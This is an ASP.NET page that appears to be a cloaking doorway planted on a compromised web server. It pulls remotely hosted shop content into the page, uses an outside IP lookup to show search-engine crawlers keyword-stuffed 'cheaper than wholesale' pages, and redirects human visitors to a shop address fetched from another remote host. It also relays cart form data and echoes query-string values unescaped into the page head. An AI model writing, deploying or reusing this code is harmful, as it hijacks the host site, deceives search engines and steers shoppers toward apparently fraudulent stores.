<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
             tz();
            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            a = new Random(System.DateTime.Now.Millisecond);
            string pname = Request.CurrentExecutionFilePath.Replace("/", "");
            string hyzhdy = "https://jg2020.jgwebdy.com/GD_Page.aspx";

            if (Request.QueryString["type"] != null)
            {
                if (Request.QueryString["type"] == "addtocart")
                {
                    content = webclient.DownloadString("https://jg2020.jgwebdy.com/cart.aspx?gj=com");
                    content = content.Replace("pppid", Request.Form["pid"]);
                    content = content.Replace("tupian", Request.Form["pic"]);
                    content = content.Replace("mingzi", Request.Form["pname"]);
                    content = content.Replace("danjia", Request.Form["price"]);
                    content = content.Replace("shuliang", "1");
                    content = content.Replace("zongjia", Request.Form["price"]);
                    content = content.Replace("cima", Request.Form["s1"]);
                    content = content.Replace("curfh", Request.Form["fh"]);
                    content = content.Replace("pricetype", Request.Form["pricetype"]);
                    content = content.Replace("ZZZZZ", webclient.DownloadString("https://jgdy.jgwebdy.com/lydy/tz.txt"));
                }
                else if (Request.QueryString["type"] == "search")
                {
                    string URL = hyzhdy + "?cid=21&xi=1-5&xc=12-15&searchtxt=" + Request.QueryString["searchtxt"] + "&you=0&page=" + pname;
                    content = webclient.DownloadString(URL);
                  
                }

            }
            else
            {
                string URL = "";
                if (Request.QueryString["shop"] != null)
                {
                    URL = hyzhdy + "?cid=21&shop=" + Request.QueryString["shop"] + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"] + "&pl=" + Request.QueryString["pl"] + "&pr=" + Request.QueryString["pr"] + "&you=" + Request.QueryString["you"] + "&mt=https://jgdy.jgwebdy.com/jgdy/enjk21.txt&yt=";

                }
                else
                {
                    URL = hyzhdy + "?cid=21&xi=1-5&xc=12-15&pnum=" + Request.QueryString["pnum"] + "&you=0&page=" + pname;
                }
                content = webclient.DownloadString(URL);
                content = content.Replace("%20", "+");
                content = content.Replace("HHHHH", pname);
                content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
                content = content.Replace("AAAAA", pname + "?gj=com&type=addtocart");
                content = content.Replace("DDDDD", Request.QueryString["shop"] + "  ");
                content = content.Replace("QQQQQ", HttpContext.Current.Request.Url.Host);


            }


        }
    }

	public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://jd.cdoi09.fr/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["shop"] != null)
            {
                string tzurl = webclient.DownloadString("http://js.jg2890.com/buytz.txt").ToLower();
                Response.Redirect(tzurl + "?cid=21&cname=" + HttpUtility.UrlEncode(Request.QueryString["shop"]) + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"]);
            }
            if (Request.QueryString["searchtxt"] != null)
            {
                string tzurl = webclient.DownloadString("http://js.jg2890.com/buytz.txt").ToLower();
               
                Response.Redirect(tzurl + "?cid=21&cname=" + HttpUtility.UrlEncode(Request.QueryString["searchtxt"]) + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"]);
            }
        }

    }
    public System.Net.WebClient webclient = null;
    public string content = "";
    public System.Random a = null;







</script><html xmlns="http://www.w3.org/1999/xhtml"><head>

    <meta http-equiv="Content-Language" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title><%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%>  </title>
    <meta name="keywords" content="<%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="description" content="<%=Request.QueryString["shop"]%> <%=a.Next(50, 70)%>% Cheaper Than Wholesale Price> | <%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="robots" content="index,follow,all" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="Robots" content="index, follows">







</head><body>    <%=content %>
</body>
</html>
